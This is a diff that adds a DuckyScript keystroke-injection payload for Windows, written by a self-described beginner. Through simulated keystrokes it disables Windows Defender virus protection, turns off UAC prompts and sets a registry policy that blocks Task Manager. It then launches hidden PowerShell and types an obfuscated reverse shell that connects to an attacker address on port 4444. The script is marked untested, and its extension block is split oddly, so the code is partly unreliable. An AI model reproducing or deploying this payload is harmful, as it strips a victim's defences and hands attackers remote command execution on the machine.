@@ -1,0 +1,115 @@
+REM Title: EVILEN FROGGIN 1.0
+REM Made By: Giraffe
+REM Description: This DuckyScript will execute a powershell command to disable task manager, then, backdoor entry by disabling Windows Defender, and finally running a reverse shell. (This is my first time ever coding in Duckyscript so bare with me lol.)
+REM Date: February 2026
+REM Credits: Thank you to 0i41E (Reverse shell code).
+REM Compatible with: Windows 10, Windows 11, Windows 10 Home Edition, Windows 11 Home Edition.
+REM HAS NOT BEEN TESTED YET!!!
+
+REM Define the attackers IP & Port for the Reverse Shell to work
+DEFINE ADDRESS '0.0.0.0'
+DEFINE PORT 4444
+
+
+EXTENSION DETECT_READY
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+
+        TARGETS:
+            Any system that reflects CAPSLOCK will detect minimum required delay
+            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+    END_REM
+
+REM Disable Virus & Threat Protection
+REM __________________________________
+
+DELAY 1000 
+CONTROL ESCAPE
+DELAY 500
+STRING virus protection
+DELAY 500
+ENTER
+DELAY 1000
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+ALT F4
+
+REM Disable UAC/Admin Prompt
+REM _________________________
+
+DELAY 500
+CONTROL ESCAPE
+DELAY 500
+STRING uac
+DELAY 500
+ENTER
+DELAY 500
+DOWNARROW
+DELAY 500
+DOWNARROW
+DELAY 500
+DOWNARROW
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+LEFT
+DELAY 500
+ENTER
+
+REM Editing Registry Editor settings to disable task manager
+DELAY 500
+GUI
+DELAY 500
+STRING windows powershell
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 500
+STRING Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -Value 1
+DELAY 500
+ENTER
+DELAY 500
+ALT F4
+
+
+
+REM REVERSE SHELL
+REM _____________________
+
+    REM CONFIGURATION:
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+DELAY 1000
+GUI r
+DELAY 500
+STRINGLN powershell -NoP -NonI -w h
+DELAY 500
+STRINGLN $0LVhbQ=[TyPE]('tExT'+'.enCOD'+'InG');$C=.('New'+'-Obj'+'ect') System.Net.Sockets.TCPClient( ADDRESS , PORT );$S=$C.GetStream();[byte[]]$b=0..65535|&('%'){0};while(($i=$S.Read($b,0,$b.Length))-ne 0){;$d=(&('New'+'-Ob'+'ject') -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$X=(&('ie'+'x') $d 2>&1 | .('Out'+'-St'+'ring'));$Z=$X+'Ducky@PS '+(&('g'+'l'))+'> ';$sbt=($0lvHBq::ASCII).GetBytes($Z);$S.Write($sbt,0,$sbt.Length);$S.Flush()};$C.Close();exit
+CAPSLOCK
